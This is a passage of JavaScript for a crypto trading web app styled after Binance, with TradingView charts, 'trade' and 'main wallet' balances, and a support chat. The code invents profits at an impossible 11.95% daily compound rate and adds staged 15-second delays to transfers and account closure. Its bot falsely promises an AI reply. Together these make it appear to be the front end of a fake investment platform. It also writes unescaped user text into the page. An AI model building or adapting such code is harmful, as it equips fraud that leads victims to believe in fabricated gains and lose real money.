  document.getElementById('tradeTotalBalance').textContent = `$${usdtAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  // If homepage/main portfolio balance element exists, update it too
  const mainPortfolio = getMainPortfolio();
  if (document.getElementById('mainPortfolioBalance'))
    document.getElementById('mainPortfolioBalance').textContent = `$${mainPortfolio.totalPortfolio.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
}

// ---- Trading Simulation Functions ----
function fillMaxTradingAmount() {
  document.getElementById('investmentAmount').value = usdtAmount.toFixed(2);
}

function calculateTradingReturns() {
  const amount = parseFloat(document.getElementById('investmentAmount').value);
  const duration = parseInt(document.getElementById('tradingDuration').value);
  if (!amount || amount <= 0) {
    alert('Please enter a valid investment amount');
    return;
  }
  if (!duration || duration <= 0) {
    alert('Please select a valid duration');
    return;
  }
  if (amount > usdtAmount) {
    alert('Investment amount cannot exceed available balance');
    return;
  }
  // Calculate compound interest with 11.95% daily rate
  const dailyRate = TRADE_RETURNS_RATE;
  const totalDays = duration * 30; // Approximate 30 days per month
  const finalAmount = amount * Math.pow(1 + dailyRate, totalDays);
  const totalProfit = finalAmount - amount;
  const roi = (totalProfit / amount) * 100;
  tradingSimulationData = {
    initialAmount: amount,
    duration: duration,
    totalDays: totalDays,
    finalAmount: finalAmount,
    totalProfit: totalProfit,
    roi: roi,
    dailyRate: dailyRate
  };
  // Update display
  document.getElementById('initialInvestment').textContent = `$${amount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  document.getElementById('investmentDuration').textContent = `${duration} month${duration > 1 ? 's' : ''}`;
  document.getElementById('totalDays').textContent = `${totalDays} days`;
  document.getElementById('finalAmount').textContent = `$${finalAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  document.getElementById('totalProfit').textContent = `$${totalProfit.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  document.getElementById('roi').textContent = `${roi.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}%`;
  document.getElementById('tradingResults').classList.remove('hidden');
}

function startTradingSimulation() {
  if (!tradingSimulationData) {
    alert('Please calculate returns first');
    return;
  }
  transferToTrading();
  const startTime = Date.now();
  const endTime = startTime + (tradingSimulationData.totalDays * 24 * 60 * 60 * 1000);
  localStorage.setItem('tradingSimulation', JSON.stringify({
    ...tradingSimulationData,
    startTime: startTime,
    endTime: endTime,
    isActive: true
  }));
  document.getElementById('tradingResults').classList.add('hidden');
  document.getElementById('activeTradingDisplay').classList.remove('hidden');
  updateTradingSimulation();
  tradingSimulationInterval = setInterval(updateTradingSimulation, 60000);
  showTradingToast('Trading simulation started successfully!');
}

function updateTradingSimulation() {
  const simulation = JSON.parse(localStorage.getItem('tradingSimulation') || '{}');
  if (!simulation.isActive) return;
  const now = Date.now();
  const totalDuration = simulation.endTime - simulation.startTime;
  const elapsed = now - simulation.startTime;
  const progress = Math.min(elapsed / totalDuration, 1);
  const currentValue = simulation.initialAmount * Math.pow(1 + simulation.dailyRate, simulation.totalDays * progress);
  const currentProfit = currentValue - simulation.initialAmount;
  const remainingDays = Math.max(0, Math.ceil((simulation.endTime - now) / (24 * 60 * 60 * 1000)));
  document.getElementById('currentTradingValue').textContent = `$${currentValue.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  document.getElementById('currentProfit').textContent = `$${currentProfit.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  document.getElementById('daysRemaining').textContent = `${remainingDays} days`;
  if (progress >= 1) {
    completeTradingSimulation();
  }
}

function completeTradingSimulation() {
  const simulation = JSON.parse(localStorage.getItem('tradingSimulation') || '{}');
  usdtAmount += simulation.finalAmount;
  updateBalanceDisplay();
  localStorage.removeItem('tradingSimulation');
  clearInterval(tradingSimulationInterval);
  document.getElementById('activeTradingDisplay').classList.add('hidden');
  showTradingToast(`Simulation complete! Final amount: $${simulation.finalAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`);
}

function stopTradingSimulation() {
  const simulation = JSON.parse(localStorage.getItem('tradingSimulation') || '{}');
  if (simulation.isActive) {
    const now = Date.now();
    const totalDuration = simulation.endTime - simulation.startTime;
    const elapsed = now - simulation.startTime;
    const progress = Math.min(elapsed / totalDuration, 1);
    const currentValue = simulation.initialAmount * Math.pow(1 + simulation.dailyRate, simulation.totalDays * progress);
    usdtAmount += currentValue;
    updateBalanceDisplay();
    showTradingToast(`Simulation stopped. Returned: $${currentValue.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`);
  }
  localStorage.removeItem('tradingSimulation');
  clearInterval(tradingSimulationInterval);
  document.getElementById('activeTradingDisplay').classList.add('hidden');
}

function transferToTrading() {
  if (!tradingSimulationData) {
    alert('Please calculate returns first');
    return;
  }
  if (tradingSimulationData.initialAmount > usdtAmount) {
    alert('Insufficient balance');
    return;
  }
  usdtAmount -= tradingSimulationData.initialAmount;
  updateBalanceDisplay();
  showTradingToast(`$${tradingSimulationData.initialAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})} transferred to trading account`);
}

function showTradingToast(message) {
  const toast = document.createElement('div');
  toast.className = 'fixed top-4 right-4 bg-accent text-accent-foreground px-4 py-2 rounded-lg shadow-lg z-[2000] transition-all duration-300';
  toast.textContent = message;
  toast.style.transform = 'translateX(400px)';
  document.body.appendChild(toast);
  setTimeout(() => { toast.style.transform = 'translateX(0)'; }, 10);
  setTimeout(() => { toast.style.transform = 'translateX(400px)'; setTimeout(() => { if (toast.parentNode) { toast.parentNode.removeChild(toast); } }, 300); }, 3000);
}

// ---- Trade SPA Modals and Page Logic ----
function renderTradeMainSection() {
  let state = getTradeState();
  usdtAmount = state.totalBalance;
  document.getElementById('tradeTotalBalance').innerText = fmtUsd(state.totalBalance);
  document.getElementById('tradeTotalEarnings').innerText = fmtUsd(state.totalEarnings);
  document.getElementById('tradeTotalReturns').innerText = fmtUsd(state.totalReturns);
  renderActiveTrades();
  embedTradeChart(state.lastSymbol || "BINANCE:BTCUSDT");
  document.getElementById('tradeMainSection').style.display = '';
  document.getElementById('tradeDynamicSection').style.display = 'none';
}

function renderActiveTrades() {
  let state = getTradeState();
  let nowTs = now();
  let html = state.trades.length ?
    state.trades.map((t,i) => {
      let left = Math.max(0, t.end-nowTs);
      return `<div class="bg-gray-800 rounded p-2 mb-2">
        <div>Asset: ${t.symbol}</div>
        <div>Duration: ${t.duration} month(s) (${formatCountdown(left)})</div>
        <div>Status: ${left>0?"Active":"Completed"}</div>
        <div>Returns: ${fmtUsd(t.returns)}</div>
        <div>Earnings: ${fmtUsd(t.earnings)}</div>
      </div>`;
    }).join('')
    : '<div class="text-gray-400">No active trades</div>';
  document.getElementById('tradeActiveTradesList').innerHTML = html;
}

// ----- Button Event Wiring -----
function setupTradeButtons() {
  document.getElementById('loadSymbol').onclick = function() {
    let symbol = document.getElementById('tradeSymbol').value;
    let state = getTradeState();
    state.lastSymbol = symbol;
    setTradeState(state);
    embedTradeChart(symbol);
  };

  document.getElementById('placeTradeBtn').onclick = function() {
    let state = getTradeState();
    if (state.totalBalance < 100) {
      alert("You need at least $100 in your trade balance to place a trade.");
      return;
    }
    renderPlaceTradeAssetPage();
  };

  document.getElementById('viewEarningsBtn').onclick = function() {
    renderEarningsPage();
  };

  document.getElementById('convertBtn').onclick = function() {
    alert("Convert flow demo");
  };

  document.getElementById('placeOrderBtn').onclick = function() {
    let state = getTradeState();
    if (state.totalBalance < 100) {
      alert("You need at least $100 in your trade balance to place a trade.");
      return;
    }
    renderPlaceTradeAssetPage();
  };

  // Footer Buttons
  document.getElementById('tvTradeBtn').onclick = function() { renderTradeMainSection(); };
  document.getElementById('tvEarningsBtn').onclick = function() { renderEarningsPage(); };
  document.getElementById('tvPortfolioBtn').onclick = function() { switchPage('home'); };
  document.getElementById('tvDepositBtn').onclick = function() { switchPage('depositPage'); };
  document.getElementById('tvTransferBtn').onclick = function() { renderTransferPage(); };

  // Header Buttons
  document.getElementById('tvNotifBtn').onclick = function() { alert("TradingView notifications (demo)"); };
  document.getElementById('tvSettingsBtn').onclick = function() { switchPage('settingsPage'); };
  document.getElementById('tvBackBtn').onclick = function() { goBackPage(); };
}

// ----- Place Trade Asset Selection -----
function renderPlaceTradeAssetPage() {
  document.getElementById('tradeMainSection').style.display = 'none';
  document.getElementById('tradeDynamicSection').style.display = '';
  document.getElementById('tradeDynamicSection').innerHTML = `
    <div class="tv-select-asset mt-4">
      <label>Select Asset to Trade:</label>
      <select id="tradeAssetSelect" class="bg-gray-800 px-2 py-2 rounded text-sm">
        <option value="BINANCE:BTCUSDT">BTC/USDT</option>
        <option value="BINANCE:ETHUSDT">ETH/USDT</option>
        <option value="BINANCE:BNBUSDT">BNB/USDT</option>
      </select>
      <button id="tradeAssetLoadBtn" class="px-3 py-2 bg-gray-800 rounded text-sm ml-2">Load Asset Chart</button>
    </div>
    <div id="tradeAssetChart" style="height:340px;" class="mt-4"></div>
    <div id="tradeDurationSection"></div>
  `;
  document.getElementById('tradeAssetLoadBtn').onclick = function() {
    let symbol = document.getElementById('tradeAssetSelect').value;
    embedTradeChart(symbol, "tradeAssetChart");
    setTimeout(() => renderTradeDurationSelect(symbol), 15000);
  };
}

// ----- Trade Duration Selection -----
function renderTradeDurationSelect(symbol) {
  document.getElementById('tradeDurationSection').innerHTML = `
    <div class="tv-trade-duration mt-4">
      <label>Select Trade Duration:</label>
      <select id="tradingDuration" class="bg-gray-800 px-2 py-2 rounded text-sm">
        ${TRADE_DURATIONS.map(d=>`<option value="${d}">${d} month${d>1?'s':''}</option>`).join('')}
      </select>
      <button id="tradeDurationBtn" class="px-3 py-2 bg-gray-800 rounded text-sm ml-2">Confirm Duration</button>
    </div>
  `;
  document.getElementById('tradeDurationBtn').onclick = function() {
    let duration = parseInt(document.getElementById('tradingDuration').value);
    setTimeout(() => renderTradeOrderPage(symbol, duration), 15000);
  };
}

function renderTradeOrderPage(symbol, duration) {
  document.getElementById('tradeDynamicSection').innerHTML = `
    <div class="tv-trade-order mt-4">
      <div>Asset: <b>${symbol}</b></div>
      <div>Duration: <b>${duration} month${duration>1?'s':''}</b></div>
      <button id="tradeOrderBtn" class="px-4 py-2 bg-green-500 text-white font-bold rounded">Place Order</button>
    </div>
  `;
  document.getElementById('tradeOrderBtn').onclick = function() {
    activateTrade(symbol, duration);
    alert("Trade activated!");
    renderTradeMainSection();
  };
}

function activateTrade(symbol, duration) {
  let state = getTradeState();
  let tradeStart = now();
  let tradeEnd = tradeStart + duration*2592000;
  let amount = state.totalBalance || 1000;
  let returns = 0, earnings = 0;
  let trade = {symbol, duration, start: tradeStart, end: tradeEnd, amount, returns, earnings, active: true};
  state.trades.push(trade);
  setTradeState(state);
  startTradeReturnsGenerator();
}

// ----- Earnings Page -----
function renderEarningsPage() {
  let state = getTradeState();
  document.getElementById('tradeMainSection').style.display = 'none';
  document.getElementById('tradeDynamicSection').style.display = '';
  document.getElementById('tradeDynamicSection').innerHTML = `
    <div class="tv-earnings">
      <div class="font-bold text-lg mb-2">Total Earnings: <span>${fmtUsd(state.totalEarnings)}</span></div>
      <div id="tvEarningsChart" style="height:350px;"></div>
      <button id="tvTransferBtnEarnings" class="px-4 py-2 bg-yellow-500 text-black font-bold rounded mt-3">Transfer</button>
      <button id="earningsBackBtn" class="px-4 py-2 bg-gray-800 text-white font-bold rounded mt-3">Back</button>
    </div>
  `;
  embedTradeChart(state.lastSymbol, "tvEarningsChart");
  document.getElementById('tvTransferBtnEarnings').onclick = () => renderTransferPage();
  document.getElementById('earningsBackBtn').onclick = () => renderTradeMainSection();
}

// ----- Transfer Page (Binance style) -----
function renderTransferPage() {
  document.getElementById('tradeMainSection').style.display = 'none';
  document.getElementById('tradeDynamicSection').style.display = '';
  document.getElementById('tradeDynamicSection').innerHTML = `
    <div class="tv-transfer p-4">
      <label>Enter amount:</label>
      <input id="transferAmountInput" class="input-black-text border border-gray-800 px-3 py-2 rounded text-sm mb-2" type="number" />
      <div class="mt-2 mb-2">
        <button id="switchTransferBtn" class="px-3 py-2 bg-gray-800 rounded">Switch</button>
        <span id="transferToLabel" class="ml-2">Transfer to Main Wallet</span>
      </div>
      <button id="transferConfirmBtn" class="px-4 py-2 bg-yellow-500 text-black font-bold rounded mt-2">Transfer</button>
      <button id="transferBackBtn" class="px-4 py-2 bg-gray-800 text-white font-bold rounded mt-3">Back</button>
      <div id="transferMsg" class="mt-3"></div>
    </div>
  `;
  let transferTo = "main";
  document.getElementById('switchTransferBtn').onclick = function() {
    if(transferTo === "main") {
      transferTo = "trade";
      document.getElementById('transferToLabel').innerText = "Transfer to Trade Account";
    } else {
      transferTo = "main";
      document.getElementById('transferToLabel').innerText = "Transfer to Main Wallet";
    }
  };
  document.getElementById('transferConfirmBtn').onclick = async function() {
    let amt = parseFloat(document.getElementById('transferAmountInput').value);
    if(isNaN(amt) || amt <= 0) { document.getElementById('transferMsg').innerText = "Enter valid amount."; return; }
    document.getElementById('transferMsg').innerText = "Processing...";
    await sleep(15000);

    let state = getTradeState();
    let main = getMainPortfolio();

    if(transferTo === "main") {
      if(amt > state.totalBalance) { document.getElementById('transferMsg').innerText = "Insufficient trade balance"; return; }
      state.totalBalance -= amt;
      main.totalPortfolio += amt;
      setMainPortfolio(main);
      document.getElementById('transferMsg').innerText = "Transferred to Main Wallet!";
    } else {
      if(amt > main.totalPortfolio) { document.getElementById('transferMsg').innerText = "Insufficient main wallet balance"; return; }
      state.totalBalance += amt;
      main.totalPortfolio -= amt;
      setMainPortfolio(main);
      document.getElementById('transferMsg').innerText = "Transferred to Trade Account!";
    }
    setTradeState(state);
    renderTradeMainSection();
  };
  document.getElementById('transferBackBtn').onclick = () => renderTradeMainSection();
}

// ----- Returns Generator -----
function startTradeReturnsGenerator() {
  let state = getTradeState();
  let nowTs = now();
  state.trades.forEach(trade => {
    if(trade.active && nowTs < trade.end) {
      let daysPassed = Math.floor((nowTs - trade.start)/86400);
      let returns = trade.amount * Math.pow(1 + TRADE_RETURNS_RATE, daysPassed) - trade.amount;
      trade.returns = returns;
      trade.earnings = trade.amount + returns;
      if(nowTs >= trade.end) trade.active = false;
    }
  });
  state.totalReturns = state.trades.reduce((a,t)=>a+t.returns,0);
  state.totalEarnings = state.trades.reduce((a,t)=>a+t.earnings,0);
  setTradeState(state);
  renderTradeMainSection();
}
setInterval(startTradeReturnsGenerator, 60000);

// ----- Trading Simulation Initialization -----
function initializeTradingSimulation() {
  const simulation = JSON.parse(localStorage.getItem('tradingSimulation') || '{}');
  if (simulation.isActive) {
    document.getElementById('activeTradingDisplay').classList.remove('hidden');
    updateTradingSimulation();
    tradingSimulationInterval = setInterval(updateTradingSimulation, 60000);
  }
}

// ----- On Page Load -----
window.addEventListener('DOMContentLoaded', function() {
  initializeTradingView();
  renderTradeMainSection();
  setupTradeButtons();
  initializeTradingSimulation();
});

// ========== SETTINGS ==========
$('#settingsBtn').onclick = function() { switchPage('settingsPage'); };
$('#closeAccountBtn').onclick = async function() {
  if (!app.twofaStatus[app.user.accountId]) { alert("Enable 2FA first."); return; }
  alert("Deactivating..."); await sleep(15000);
  let map = getLS(LS.walletMap,{}); delete map[app.user.address];
  saveLS(LS.walletMap, map);
  delLS(LS.user); app.user=null;
  switchPage('landingPage');
};
// Theme
$('#themeSelect').onchange = function() {
  app.theme = this.value; saveLS(LS.theme, app.theme);
  document.body.className = app.theme==="light"?"bg-white text-black":"bg-black text-white";
};

// ========== SUPPORT ==========
$('#supportBtn').onclick = function() { switchPage('supportPage'); };
$('#supportSendBtn').onclick = function() {
  let msg = $('#supportUserMsg').value.trim();
  if (!msg) return;
  let box = $('#supportChatBox');
  box.innerHTML += `<div class="mb-2"><b>You:</b> ${msg}</div>`;
  $('#supportUserMsg').value = "";
  setTimeout(()=>{box.innerHTML += `<div class="mb-2 text-yellow-400"><b>Bot:</b> Thank you for your message. Our AI assistant will reply soon. For now, check FAQs above.</div>`;box.scrollTop=box.scrollHeight;},1000);
};

// ========== NOTIFICATIONS ==========
$('#notifBtn').onclick = function() { switchPage('notifPage'); };
$('#notifToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifPageToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifPageToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifList').innerText = app.notifMsgs.slice(-10).map(msg=>"<div>"+msg+"</div>").join("");

// ========== TRANSACTIONS / ACTIVITY ==========
$('#transactionsBtn').onclick = function() {
  switchPage('home');
  renderOngoingWithdrawals();
  alert("Transactions: "+JSON.stringify(app.transactions));
};
$('#activityBtn').onclick = function() {
  switchPage('home');
  renderOngoingWithdrawals();
  alert("Activities: "+JSON.stringify(app.transactions));
};
$('#disconnectBtn').onclick = async function() {
  alert("Disconnecting...");
  await sleep(15000);
  delLS(LS.user); app.user=null; switchPage('landingPage');
};
// END
